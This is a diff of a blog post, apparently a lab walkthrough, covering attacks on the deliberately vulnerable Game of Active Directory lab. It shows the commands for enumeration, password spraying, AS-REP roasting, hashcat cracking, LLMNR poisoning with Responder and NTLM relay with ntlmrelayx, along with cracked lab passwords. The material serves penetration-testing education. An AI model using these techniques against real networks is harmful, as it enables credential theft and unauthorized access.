@@ -1,9 +1,9 @@
 ---
-title: "GOAD Part 1: AD Recon, NTLM relay, ASREPRoasting & Kerberoasting"
+title: "GOAD Part 1: AD Recon, NTLM relay, Password Spraying & ASREPRoasting "
 author: "Trevor Saudi"
 date: 2024-06-11
 description: ""
-draft: true
+draft: false
 subtitle: ""
 tags:
 - Active Directory
@@ -45,9 +45,9 @@ tags:
 
 ## Introduction
 
-- Game of Active Directory is a fully functional AD lab environment, misconfigured with several AD bug types designed to help understand various AD security concepts. I recently deployed it on a Windows host and have been playing with it.
-- In this n-part series, we will explore the various AD misconfigurations and how we can abuse them while maintaining our OPSEC. Part 1 will focus on how we go about with enumeration of the environment to map out the various open services and ports and discover of users in the network. The recon process is the most crucial part as it makes the rest of our attack paths clearer and straightforward.
-- We will proceed with looking at some misconfigurations we can exploit when we don't have credentials in an AD environment such as NTLM relay and ASREPRoasting then finish of with kerberoasting. 
+- <a href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank">Game of Active Directory</a> is a fully functional AD lab environment, misconfigured with several AD issues designed to help understand various AD security concepts. 
+- In this n-part series, we will explore how we can abuse the misconfigurations .In part 1, we focus on `enumerating` the environment to find `domains, domain controllers, usernames and groups`. We further leverage this to conduct various attacks, showcasing techniques like `password spraying & ASREPRoasting`.
+- We then finish off by exploring what attacks can be carried out when we have `no credentials or usernames` to work with such as the `LLMNR Poisoning and NTLM relay`.
 
 ## Network Diagram
 
@@ -55,7 +55,7 @@ tags:
         <img src="/posts/2024-06-11_red_team06/images/GOAD_schema.png" alt="no image" />
 </div>
 
-## Reconnaissance
+## Reconnaissance and Enumeration
 
 - From our network diagram, we are dealing with 5 different machines across 3 domains in the network. 
 1. `north.sevenkingdoms.local`
@@ -66,11 +66,11 @@ tags:
 3. `essos.local`
     - DC02 (mereen)
     - SRV03 (braavos)
-- The creators of GOAD - Orange Cyberdefense - have also come up with this mindmap that structures our AD pentesting approach. We will frequently refer to this resource throughout these writeups 
+- The creators of GOAD - Orange Cyberdefense - have also come up with <a href="https://orange-cyberdefense.github.io/ocd-mindmaps/" target="_blank">this</a> mindmap that structures our AD pentesting approach. We will frequently refer to this resource when exploring the lab
 
 ### Hosts file setup
 
-- We can begin by mapping out all the machines in our hosts file. Using the IP information and domains given to us, we can then find the `domain controllers` in the network.
+- We can begin by mapping out all the machines in our hosts file. Using the IP information and domains given to us, we can find the `domain controllers` in the network.
 
 ```bash
 nslookup -type=SRV _ldap._tcp.dc._msdcs.north.sevenkingdoms.local 192.168.56.11
@@ -109,28 +109,42 @@ _ldap._tcp.dc._msdcs.essos.local        service = 0 100 389 meereen.essos.local.
 192.168.56.23   braavos.essos.local braavos
 ```
 
-## Domain User enumeration
+### Domain User enumeration
 
-- We have several options for this. We can use `crackmapexec or enum4linux` to check for this information.
+- We have several options for this. We will use `crackmapexec and enum4linux` to check for this information.
 
 <div >
         <img src="/posts/2024-06-21_red_team07/images/find-user-list.png" alt="no image" />
 </div>
 
 ```powershell
-crackmapexec smb ips.txt --users 
+crackmapexec smb 192.168.56.10-23 --users 
 ```
 
 <div >
         <img src="/posts/2024-06-21_red_team07/images/users-enum.png" alt="no image" />
 </div>
 
-- We get some domain users and credentials in a user's description.
+- We get some domain users from the north domain and credentials in a user's description.
 
+| Hostname     | Username                                  |
+|--------------|-------------------------------------------|
+| WINTERFELL   | north.sevenkingdoms.local\Guest           |
+| WINTERFELL   | north.sevenkingdoms.local\arya.stark      |
+| WINTERFELL   | north.sevenkingdoms.local\sansa.stark     |
+| WINTERFELL   | north.sevenkingdoms.local\brandon.stark   |
+| WINTERFELL   | north.sevenkingdoms.local\rickon.stark    |
+| WINTERFELL   | north.sevenkingdoms.local\hodor           |
+| WINTERFELL   | north.sevenkingdoms.local\jon.snow        |
+| WINTERFELL   | north.sevenkingdoms.local\samwell.tarly   |
+| WINTERFELL   | north.sevenkingdoms.local\jeor.mormont    |
+| WINTERFELL   | north.sevenkingdoms.local\sql_svc         |
 
 {{< alert "circle-info" >}}
 samwell.tarly : Heartsbane 
 {{< /alert >}}
+
+<br>
 
 - Recon is a recursive process. Upon getting valid credentials, you should rerun your user enumeration commands with credentials to see whether you get more information
 
@@ -138,17 +152,19 @@ samwell.tarly : Heartsbane
         <img src="/posts/2024-06-21_red_team07/images/users-enum2.png" alt="no image" />
 </div>
 
-- We get more users on the domain
-
-## Domain Group enumeration
-
-- I ran crackmapexec without creds but we don't get an output on any domain
+- We get more users on the domain. 
 
 <div>
-        <img src="/posts/2024-06-21_red_team07/images/crackmapexec-groups.png" alt="no image" />
+        <img src="/posts/2024-06-21_red_team07/images/users-enum2.png" alt="no image" />
 </div>
 
-- We can run either `crackmapexec` or `enum4linux` with  samwell's creds and extract some domain group information. We are only able to retrieve information on the `north.sevenkingdoms.local` domain.
+
+### Domain Group enumeration
+
+- I ran crackmapexec without creds but did don't get an output on any domain
+
+
+- We can run either `crackmapexec` or `enum4linux` with  samwell's creds and extract some domain group information. We will only able to retrieve information on the `north` domain.
 
 ```bash
 enum4linux -a -U 192.168.56.11  -u samwell.tarly -p Heartsbane
@@ -169,16 +185,92 @@ enum4linux -a -U 192.168.56.11  -u samwell.tarly -p Heartsbane
 | Stark                         | 1106 | NORTH\arya.stark, NORTH\eddard.stark, NORTH\catelyn.stark, NORTH\robb.stark, NORTH\sansa.stark, NORTH\brandon.stark, NORTH\rickon.stark, NORTH\hodor, NORTH\jon.snow |
 | Domain Users                  | 513  | NORTH\Administrator, NORTH\vagrant, NORTH\krbtgt, NORTH\SEVENKINGDOMS$, NORTH\arya.stark, NORTH\eddard.stark, NORTH\catelyn.stark, NORTH\robb.stark, NORTH\sansa.stark, NORTH\brandon.stark, NORTH\rickon.stark, NORTH\hodor, NORTH\jon.snow, NORTH\samwell.tarly, NORTH\jeor.mormont, NORTH\sql_svc |
 
-## Poisoning
+## Valid Usernames
+
+- With valid usernames for the `north` domain, we can attempt a `password spray` to hunt for `valid credentials` or perform an `ASREPRoast` using the valid credentials we obtained
+
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/username-nocreds.png" alt="no image" />
+</div>
+
+### Password Spraying
+
+- In this attack, we aim to identify valid user credentials by attempting few `commonly used passwords`. In organizations with a fairly high number of users, there's a chance that some are using weak passwords. 
+- This attack contrasts with a standard brute-force that involves attempting many passwords against a single account which we cannot launch against this environment due to the account lockout policy shown below.
+
+- `enum4linux` scan results:
+
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/password-info.png" alt="no image" />
+</div>
+
+
+- We can use `crackmapexec's --no-bruteforce` parameter to achieve the password spray. I created a list of the user accounts and proceeded to use that list for the password list as well.
+
+```c
+crackmapexec smb 192.168.56.11 -u actualusers.txt -p actualusers.txt --no-bruteforce
+```
+
+
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/hodor.png" alt="no image" />
+</div>
+
+- We get `hodor's` credentials
+
+{{< alert "circle-info" >}}
+hodor : hodor
+
+{{< /alert >}}
+
+### AS-REPRoasting
+
+- The authentication process for kerberos can be split into the following parts.
+
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/asrep.jpg" alt="no image" />
+</div>
+
+- `AS-REPRoasting` allows attackers to extract Ticket Granting Tickets (TGT) for accounts that don't have Kerberos `pre-authentication` enabled. Attackers can request an Authentication Service Response (AS-REP) from the KDC without knowing the user's password. This response contains credential material that can be cracked offline.
+- `Pre-authentication` ensures users send encrypted requests to the KDC when authenticating to services. When disabled, users send plain text requests and receive an encrypted AS-REP, making them vulnerable to offline cracking.
+
+- We need valid user credentials (low privileged accounts work) to identify the target accounts. Using `samwell.tarly's` creds and `impacket-GetNPUsers`, we can enumerate the users
+
+```powershell
+impacket-GetNPUsers north.sevenkingdoms.local/samwell.tarly:Heartsbane -request
+```
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/as-rep.png" alt="no image" />
+</div>
+
+- Proceed to crack the credentials with hashcat.
+
+```powershell
+hashcat -m 18200 -a 0 brandon.hash /usr/share/wordlists/rockyou.txt.gz 
+```
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/cracked.png" alt="no image" />
+</div>
+
+{{< alert "circle-info" >}}
+brandon.stark : iseedeadpeople
+{{< /alert >}}
+
+## No Valid Credentials/Usernames
+
+- Lastly we will look at LLMNR Poisoning. In the event that you do not find any valid credentials or usernames, this is an essential step to take.
+
+### LLMNR Poisoning
 
 <div>
         <img src="/posts/2024-06-21_red_team07/images/poisoning.png" alt="no image" />
 </div>
 
 - LLMNR (Link-Local Multicast Resolution), is a protocol in Windows used to resolve NetBIOS names of computers on the same subnet when DNS resolution fails. When attempting to locate unknown resources in a network, LLMNR multicasts requests across a network to attempt to find unknown routes e.g shares.
+
 - Attackers can trick devices to sending sensitive information by pretending to be the resource that another computer is trying to locate. 
 
-### 1. We listen in the interface we're connected in the subnet
+#### 1. Listen and capture hashes
 
 ```powershell
 sudo responder -I eth1
@@ -195,9 +287,9 @@ sudo responder -I eth1
         <img src="/posts/2024-06-21_red_team07/images/eddard.stark.png" alt="no image" />
 </div>
 
-### 2. Crack with hashcat
+#### 2. Crack with hashcat
 
-```bash
+```powershell
 hashcat -m 5600 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt.gz 
 ```
 
@@ -210,6 +302,80 @@ robb.stark : sexywolfy
 - `edd's` hash could not be cracked but, we can relay the hashes to machines where `SMB signing` is disabled. SMB signing prevents relay attacks by appending a digital signature on packets for integrity checks.
 
 
-## Password spraying
+#### 3. Find targets for relaying
 
-- Now that we have some information to work with, we can start out with some simple attacks such as password spra
+- We can use crackmapexec to find the target where SMB signing has been disabled.
+
+```powershell
+crackmapexec smb 192.168.56.10-23 --gen-relay-list relay-targets.txt
+```
+
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/relay-list.png" alt="no image" />
+</div>
+
+- Castleback and Braavos domain controllers are vulnerable. For the attack to work, the user whose hashes being relayed has to be a local admin on the target.
+
+- Disable SMB and HTTP Servers on responder to allow ntlmrelayx to relay the hashes instead of authenticating to itself. In Kali, the path is in the following folder
+
+```powershell
+vi /etc/responder/Responder.conf
+```
+
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/responder-options.png" alt="no image" />
+</div>
+
+- Start ntlmrelayx 
+
+```powershell
+impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks  
+```
+
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/start-ntlmrelayx.png" alt="no image" />
+</div>
+
+- Start responder as well
+
+
+```powershell
+sudo responder -I eth1
+```
+
+- After a while we see this output where `eddard.stark` is able to authenticate to the `mereen` and `braavos` server.
+
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/edd-auth.png" alt="no image" />
+</div>
+
+- If we type the command `socks`, we can also see the admin status of our connection to the machines
+
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/socks.png" alt="no image" />
+</div>
+
+## Appendix
+
+### Valid Credentials
+
+| Username         | Password          |
+|------------------|-------------------|
+| samwell.tarly    | Heartsbane        |
+| hodor            | hodor             |
+| brandon.stark    | iseedeadpeople    |
+| robb.stark       | sexywolfy         |
+
+
+### Valid Users
+
+
+| Group                         | RID  | Members                                                                                               |
+|-------------------------------|------|-------------------------------------------------------------------------------------------------------|
+| Mormont                       | 1108 | NORTH\jeor.mormont                                                                                    |
+| Night Watch                   | 1107 | NORTH\jon.snow, NORTH\samwell.tarly, NORTH\jeor.mormont                                               |
+| Domain Guests                 | 514  | NORTH\Guest                                                                                           |
+| Group Policy Creator Owners   | 520  | NORTH\Administrator                                                                                   |
+| Domain Computers              | 515  | NORTH\CASTELBLACK$                                                                                    |
+| Stark                         | 1106 | NORTH\arya.stark, NORTH\eddard.stark, NORTH\catelyn.stark, NORTH\robb.stark, NORTH\sansa.stark, NORTH\brandon.stark, NORTH\rickon.stark, NORTH\hodor, NORTH\jon.snow |
+| Domain Users                  | 513  | NORTH\Administrator, NORTH\vagrant, NORTH\krbtgt, NORTH\SEVENKINGDOMS$, NORTH\arya.stark, NORTH\eddard.stark, NORTH\catelyn.stark, NORTH\robb.stark, NORTH\sansa.stark, NORTH\brandon.stark, NORTH\rickon.stark, NORTH\hodor, NORTH\jon.snow, NORTH\samwell.tarly, NORTH\jeor.mormont, NORTH\sql_svc |
